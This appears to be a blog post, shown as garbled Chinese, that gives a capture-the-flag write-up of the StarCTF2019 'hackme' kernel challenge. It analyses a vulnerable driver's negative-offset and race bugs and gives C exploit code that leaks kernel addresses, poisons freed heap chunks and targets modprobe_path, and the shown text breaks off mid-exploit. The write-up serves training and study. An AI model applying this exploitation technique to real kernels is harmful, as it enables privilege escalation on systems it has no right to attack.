<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> StarCTF2019_Hackme | FMYY&#39;S Note</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        ğŸ˜
                    </span>
                    
                    FMYY&#39;S Note
                    </a>
            </div>
            <div class="flex">
                
                <a href="/articles/">Articles</a>
                
                <button id="dark-mode-button"></button>
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>StarCTF2019_Hackme</h1>
                    <div class="post-meta">
                        <div>
                            By  on <time>January 25, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/kernel/">Kernel</a>
                            
                            <a href="/tags/pwn/">Pwn</a>
                            
                            <a href="/tags/ctf/">CTF</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>æ­¤æ¬¡é€‰æ‹©StarCTF2019çš„Hackmeé¢˜ç›®æ¥åˆ†æ</p>
<h3 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h3>
<h4 id="qemuå¯åŠ¨è„šæœ¬">Qemuå¯åŠ¨è„šæœ¬</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#! /bin/sh
</span><span class="cp"></span>qemu-system-x86_64 <span class="se">\
</span><span class="se"></span>    -m 256M <span class="se">\
</span><span class="se"></span>    -nographic -net user -net nic <span class="se">\
</span><span class="se"></span>    -kernel bzImage <span class="se">\
</span><span class="se"></span>    -append <span class="s1">&#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#39;</span> <span class="se">\
</span><span class="se"></span>    -monitor /dev/null 2&gt;/dev/null <span class="se">\
</span><span class="se"></span>    -initrd initramfs.cpio <span class="se">\
</span><span class="se"></span>    -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">2</span> <span class="se">\
</span><span class="se"></span>    -cpu qemu64,smep,smap  <span class="se">\
</span><span class="se"></span>    -s
</code></pre></td></tr></table>
</div>
</div><p>å¼€å¯ä»¥ä¸‹ä¿æŠ¤</p>
<pre><code>SMEP:  ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤,ä¿æŠ¤å†…æ ¸æ˜¯å…¶ä¸å…è®¸æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç 
SMAP:  ç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤,ç¦æ­¢å†…æ ¸è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®
KASLR: å†…æ ¸åœ°å€éšæœºåŒ–
       åŒæ—¶,é•œåƒä»¥å¤šçº¿ç¨‹å½¢å¼å¯åŠ¨
</code></pre>
<h4 id="etcinitdrcs">/etc/init.d/rcS</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
<span class="nb">echo</span> <span class="s2">&#34;CiAgICAgICAgIyAgICMgICAgIyMjIyAgICAjIyMjIyAgIyMjIyMjCiAgICAgICAgICMgIyAgICAj
</span><span class="s2">ICAgICMgICAgICMgICAgIwogICAgICAgIyMjICMjIyAgIyAgICAgICAgICAjICAgICMjIyMjCiAg
</span><span class="s2">ICAgICAgICMgIyAgICAjICAgICAgICAgICMgICAgIwogICAgICAgICMgICAjICAgIyAgICAjICAg
</span><span class="s2">ICAjICAgICMKICAgICAgICAgICAgICAgICAjIyMjICAgICAgIyAgICAjCgo=&#34;</span> <span class="p">|</span> base64 -d

mount -t proc none /proc
mount -t devtmpfs none /dev
mkdir /dev/pts
mount /dev/pts

insmod /home/pwn/hackme.ko
chmod <span class="m">644</span> /dev/hackme

<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/dmesg_restrict <span class="c1"># å†™0,å¯é€šè¿‡ dmseg å‘½ä»¤æŸ¥çœ‹å†…æ ¸æ—¥å¿—</span>
<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/kptr_restrict  <span class="c1"># å¯è¯»å–/proc/kallsyms,ä¸ºä½•æ­¤å¤„æˆ‘ cat /proc/kallsyms æŒ‡é’ˆåœ°å€éƒ½æ˜¯0</span>
cat /proc/modules
cat /proc/kallsyms <span class="p">|</span> grep prepare_cred
<span class="nb">cd</span> /home/pwn
chown -R root /flag
chmod <span class="m">400</span> /flag

<span class="c1">#cat /proc/slabinfo | grep cred_jar</span>
chown -R 1000:1000 .
setsid cttyhack setuidgid <span class="m">1000</span> sh

umount /proc
poweroff -f
</code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬æ‰“å°äº†é©±åŠ¨æ¨¡å—hackme.koåŠ è½½åœ°å€,å¯ä»¥æ–¹ä¾¿ä½¿ç”¨GDBè¿›è¡Œè°ƒè¯•</p>
<h4 id="é©±åŠ¨æ¨¡å—">é©±åŠ¨æ¨¡å—</h4>
<p>é©±åŠ¨å†™äº†ä¸€ä¸ªå¸¸è§„Pwnä¸­çš„å †é¢˜åŠŸèƒ½ç›¸ä¼¼çš„ç»“æ„,å¢åˆ æŸ¥æ”¹åŠŸèƒ½éƒ½æœ‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">// case 0x30000: add
</span><span class="c1">// case 0x30001: delete
</span><span class="c1">// case 0x30002: write_to_kernel
</span><span class="c1">// case 0x30003: read_from_kernel
</span><span class="c1"></span><span class="k">struct</span> <span class="n">user_arg</span> <span class="p">{</span>
	<span class="n">size_t</span> <span class="n">index</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">;</span>
	<span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
	<span class="n">size_t</span> <span class="n">off</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­å­˜åœ¨å¦‚ä¸Šä¸€ä¸ªç»“æ„ä½“,åˆ©ç”¨ioctlä¸é©±åŠ¨äº¤äº’,ä¼šè¯»å–ä¸Šè¿°0x20å¤§å°çš„æ•°æ®åˆ°å†…æ ¸ä¸­</p>
<pre><code>copy_from_user(&amp;INDEX, arg, 0x20LL);
</code></pre>
<h5 id="0x30000-add">0x30000 add</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x3000</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
	<span class="n">User_ptr</span> <span class="o">=</span> <span class="n">user_ptr</span><span class="p">;</span>
	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">BSS_ptr</span> <span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">_kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mh">0x6000C0LL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">k_ptr</span> <span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
	<span class="o">*</span><span class="n">BSS_ptr</span> <span class="o">=</span> <span class="n">k_ptr</span><span class="p">;</span>
	<span class="n">copy_from_user</span><span class="p">(</span><span class="n">k_ptr</span><span class="p">,</span> <span class="n">User_ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
	<span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h5 id="0x30001-delete">0x30001 delete</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30001</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">kfree</span><span class="p">(</span><span class="n">k_ptr</span><span class="p">,</span> <span class="n">Arg</span><span class="p">);</span>
		<span class="o">*</span><span class="n">BSS_ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
		<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h5 id="0x30002-write_to_kernel">0x30002 write_to_kernel</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30002</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="o">&amp;&amp;</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">copy_from_user</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">k_ptr</span><span class="p">,</span> <span class="n">user_ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h5 id="0x30003-read_from_kernel">0x30003 read_from_kernel</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30003</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
		<span class="p">{</span>
			<span class="n">copy_to_user</span><span class="p">(</span><span class="n">user_ptr</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">k_ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="æ¼æ´ç‚¹">æ¼æ´ç‚¹</h4>
<ol>
<li>åœ¨<code>read_from_kernel</code>å’Œ<code>write_to_kernel</code>ä¸­,åªæ£€éªŒäº† <code>offset + size &lt;= BSS_ptr[1]</code>,æ²¡æœ‰æ£€éªŒ<code>offset</code>çš„èŒƒå›´,æ‰€ä»¥<code>offset</code>å¯ä»¥ä¸ºè´Ÿæ•°ä»è€Œå¯ä»¥å‘ä¸Šå†™æ•°æ®</li>
<li>åœ¨<code>add</code>å’Œ<code>delete</code>ä¸­,å¯¹äºå†…æ ¸å †æŒ‡é’ˆçš„å­˜æ”¾å’Œç½®0è¿‡ç¨‹ä¸­,æ²¡æœ‰<code>åŠ é”</code>,æ‰€ä»¥å­˜åœ¨<code>æ¡ä»¶ç«äº‰æ¼æ´</code>,ä¸¤ä¸ªçº¿ç¨‹,ä¸€ä¸ªé‡Šæ”¾å †å—,ä¸€ä¸ªä¿®æ”¹æˆ–è¯»å–å †å—,å³å¯å®ç°<code>UAF</code>æ¼æ´</li>
</ol>
<h3 id="åˆ©ç”¨">åˆ©ç”¨</h3>
<h4 id="1-è´Ÿæº¢å®ç°ä»»æ„å†™">1. è´Ÿæº¢å®ç°ä»»æ„å†™</h4>
<p>é¦–å…ˆç”³è¯·<code>5</code>æ¬¡å †å—,ç„¶åé‡Šæ”¾<code>1,3</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶<code>chunk3</code>æŒ‡å‘<code>chunk1</code>,å†åˆ©ç”¨è´Ÿæº¢å’Œ<code>read_from_kernel</code>å‡½æ•°,å³å¯ä»<code>index=4</code>è·å–ä½äº<code>chunk3</code>ä¸­çš„å †åœ°å€,æ­¤å¤„å †åœ°å€åç»­æ— ç”¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">heap_address</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap_address</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>ä¹‹ååˆ™çŒœæµ‹åœ¨<code>chunk0</code>ä¹‹å‰å­˜åœ¨ç³»ç»Ÿç”³è¯·çš„å †å—,é‚£ä¹ˆå…¶ä¸­ä¹Ÿè®¸æ®‹ç•™æœ‰å†…æ ¸æŒ‡é’ˆ,åŒæ ·çš„æ“ä½œ,è¯»å–<code>chunk0</code>å‰çš„æ•°æ®,ä»è€Œè®¡ç®—å‡ºå†…æ ¸åŸºå€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">
	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="o">-</span><span class="mh">0x200</span><span class="p">);</span>
	<span class="n">kernel_base</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">kernel_base</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xAE0</span><span class="p">)</span>	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">kernel_base</span> <span class="o">-=</span> <span class="mh">0x849AE0</span><span class="p">;</span> <span class="c1">// sub sysctl_table_root offset
</span><span class="c1"></span>	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Kernel:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>æ—¢ç„¶æ‹¿åˆ°äº†å†…æ ¸åœ°å€,é‚£ä¹ˆé…åˆ<code>write_to_kernel</code>ä¿®æ”¹å·²ç»é‡Šæ”¾çš„å †å—çš„é¦–ä½<code>8</code>ä¸ªå­—èŠ‚,åˆ™å¯ä»¥æ§åˆ¶å †å—ä»»æ„ç”³è¯·åˆ°æŒ‡å®šä½ç½®,æ­¤å¤„è¿˜éœ€è¦æ³„æ¼æ¨¡å—<code>hackme.ko</code>åŠ è½½åœ°å€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">size_t</span> <span class="n">p</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x811000</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// add 0x40 to avoid the junk data to cover the hackme load address
</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
	
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span> <span class="c1">// old chunk 3
</span><span class="c1"></span>	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	
	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="o">-</span><span class="mh">0x40</span><span class="p">);</span>
	<span class="n">mod_address</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Mod:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">mod_address</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡<code>mod_tree</code>çš„åç§»åŠ ä¸Š<code>kernel_base</code>è®¡ç®—å‡ºå½“å‰<code>mod_tree</code>åœ¨å†…å­˜ä¸­çš„ä½ç½®,åŠ <code>0x40</code>æ˜¯å› ä¸ºåœ¨<code>add</code>çš„æ—¶å€™,ç”³è¯·å¤šå¤§çš„æ•°æ®åˆ™ä¼šå¤åˆ¶å¤šå°‘æ•°æ®åˆ°å†…æ ¸ä¸­,è€Œ<code>mod_tree+0x18</code>å­˜æ”¾äº†<code>hackme.ko</code>çš„åŠ è½½åœ°å€,å¦‚æœåœ¨æ­¤ä¹‹å‰å› ä¸ºæ‹·è´æ•°æ®ä¼šå¯¼è‡´æƒ³è¦çš„æ•°æ®è¢«è¦†ç›–,æ‰€ä»¥ç”³è¯·<code>chunk</code>åˆ°æƒ³è¦çš„æ•°æ®æ‰€åœ¨å†…å­˜ä¹‹å,ç„¶ååˆ©ç”¨è´Ÿæº¢è¯»å–ä¹‹å‰çš„æ•°æ®è·å–<code>hackme.ko</code>çš„åŠ è½½åœ°å€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
	
	<span class="n">size_t</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2400</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span> <span class="c1">// select a suitable address to save the evil address
</span><span class="c1"></span>	                                            <span class="c1">// here I choose pool+0x100 to save them;
</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pool</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
	
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	
	<span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
	<span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x83F960</span><span class="p">;</span> <span class="c1">// it is the offset of modprobe_path in vmlinux
</span><span class="c1"></span>	
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
